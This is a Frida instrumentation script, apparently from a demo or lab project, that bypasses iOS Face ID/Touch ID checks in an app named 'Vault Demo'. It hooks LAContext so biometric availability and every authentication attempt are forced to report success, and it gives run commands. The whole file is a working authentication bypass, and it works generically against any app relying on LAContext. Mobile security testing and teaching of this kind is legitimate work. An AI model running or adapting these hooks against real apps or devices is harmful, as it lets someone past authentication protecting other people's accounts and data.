// hook.js — Frida version of the same bypass.
//
// Usage (device or simulator with a frida-server / gadget):
//   frida -U -n "Vault Demo" -l hook.js
//   frida -U -f com.bellaposa.faceidvaultdemo -l hook.js
//
// This is the exact same idea as the dylib: intercept LAContext and force the
// reply block to report success. Nice for live on/off experimentation.

if (ObjC.available) {
  const LAContext = ObjC.classes.LAContext;

  // Force canEvaluatePolicy:error: to always say "yes, biometrics available".
  Interceptor.attach(LAContext['- canEvaluatePolicy:error:'].implementation, {
    onLeave(retval) {
      console.log('[hook.js] canEvaluatePolicy -> forcing YES');
      retval.replace(ptr(1));
    }
  });

  // Intercept evaluatePolicy:localizedReason:reply: and swap the reply block
  // for one that always calls back success = YES.
  Interceptor.attach(
    LAContext['- evaluatePolicy:localizedReason:reply:'].implementation,
    {
      onEnter(args) {
        const reason = new ObjC.Object(args[3]).toString();
        console.log('[hook.js] evaluatePolicy intercepted, reason="' + reason + '"');

        const originalBlock = new ObjC.Block(args[4]);
        const savedImpl = originalBlock.implementation;
        originalBlock.implementation = function (success, error) {
          console.log('[hook.js] --> forcing reply(YES, nil)');
          savedImpl(1, NULL); // 1 == YES
        };
      }
    }
  );

  console.log('[hook.js] LAContext hooks installed.');
} else {
  console.log('[hook.js] Objective-C runtime not available.');
}
